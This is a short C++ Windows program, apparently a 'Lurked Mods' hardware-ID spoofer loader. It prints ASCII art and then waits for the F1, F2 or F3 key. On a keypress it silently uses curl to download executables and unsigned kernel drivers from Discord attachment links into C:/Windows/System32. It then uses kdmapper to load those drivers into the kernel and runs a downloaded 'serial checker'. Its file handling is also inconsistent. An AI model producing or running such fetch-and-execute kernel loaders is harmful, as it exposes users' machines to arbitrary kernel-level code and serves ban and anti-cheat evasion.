#include <iostream>
#include <Windows.h>

int main() {
    std::string chatGPTArt =
        "                               ___   _     _  _   _   _   _      _                      \n"
        "                              | __| / |   | \\| | | | | | |    | |                     \n"
        "                              | _|  | |   | .` | | |_| | | |__  | |__                   \n"
        "                              |_|   |_|   |_\\|_|  \\___/  |____| |____|                  \n"
        "                                                                                       \n"
        "                               ___   ___     ___     _     _  _   ___     ___    __  __ \n"
        "                              | __| |_  )   | _ \\   /_\\   | \\| | |   \\   / _ \\  |  \\/  |\n"
        "                              | _|   / /    |   /  / _ \\  | .` | | |) | | (_) | | |\\/| |\n"
        "                              |_|   /___|   |_|_\\ /_/ \\_\\ |_|\\_| |___/   \\___/  |_|  |_|\n"
        "                                                                                       \n"
        "                               ___   ____    ___   ___   ___   ___     _     _          \n"
        "                              | __| |__ /   / __| | __| | _ \\ |_ _|   /_\\   | |         \n"
        "                              | _|   |_ \\   \\__ \\ | _|  |   /  | |   / _ \\  | |__       \n"
        "                              |_|   |___/   |___/ |___| |_|_\\ |___| /_/ \\_\\ |____|      \n"
        "                                                                                       \n"
        "                                                                                       \n"
        "                                                                                       \n"
        "                             __                __            __   __  ___          __    \n"
        "                            / /  __ __  ____  / /__ ___  ___/ /  /  |/  / ___  ___/ / ___\n"
        "                           / /__/ // / / __/ /  '_// -_)/ _  /  / /|_/ / / _ \\/ _  / /_ /\n"
        "                          /____/\\_,_/ /_/   /_/\\_\\ \\__/ \\_,_/  /_/  /_/  \\___/\\_,_/  /__/\n"
        "                               _  __                              ___    _            \n"
        "                              / |/ / ___  _  __ ___   ____       / _ \\  (_) ___   ___ \n"
        "                             /    / / -_)| |/ // -_) / __/      / // / / / / -_) (_-< \n"
        "                            /_/|_/  \\__/ |___/ \\__/ /_/        /____/ /_/  \\__/ /___/ \n";

    std::cout << chatGPTArt << std::endl;

    while (true) {
        if (GetAsyncKeyState(VK_F1) & 1) {
            system("curl --silent https://cdn.discordapp.com/attachments/1138453365039321219/1138480829920723025/kdmapper.exe --output C:/Windows/System32/kdmapper.exe >nul 2>&1");
            system("curl --silent https://cdn.discordapp.com/attachments/1138009315169533974/1139764696266854510/yswoofdrv.sys --output C:/Windows/System32/Windows10Help.sys >nul 2>&1");
            system("start C:/Windows/System32/kdmapper.exe C:/Windows/System32/yswoofdrv.sys");
            system("curl --silent https://cdn.discordapp.com/attachments/1138009315169533974/1139819667377111141/lurked_bat_serial_checker.exe --output C:/Windows/System32/serialchecker.exe 2>&1");
            system("start C:/Windows/System32/serialchecker.exe");
        }
        if (GetAsyncKeyState(VK_F2) & 1) {
            system("curl --silent https://cdn.discordapp.com/attachments/1138453365039321219/1138480829920723025/kdmapper.exe --output C:/Windows/System32/kdmapper.exe >nul 2>&1");
            system("curl --silent https://cdn.discordapp.com/attachments/1138009315169533974/1138310926655832104/Owner.sys --output C:/Windows/System32/Windows10Help.sys >nul 2>&1");
            system("start C:/Windows/System32/kdmapper.exe C:/Windows/System32/Owner.sys");
            system("curl --silent https://cdn.discordapp.com/attachments/1138009315169533974/1139819667377111141/lurked_bat_serial_checker.exe --output C:/Windows/System32/serialchecker.exe 2>&1");
            system("start C:/Windows/System32/serialchecker.exe");
        }
        if (GetAsyncKeyState(VK_F3) & 1) {
            system("curl --silent https://cdn.discordapp.com/attachments/1138009315169533974/1139819667377111141/lurked_bat_serial_checker.exe --output C:/Windows/System32/serialchecker.exe 2>&1");
            system("start C:/Windows/System32/serialchecker.exe");
        }
    }

    return 0;
}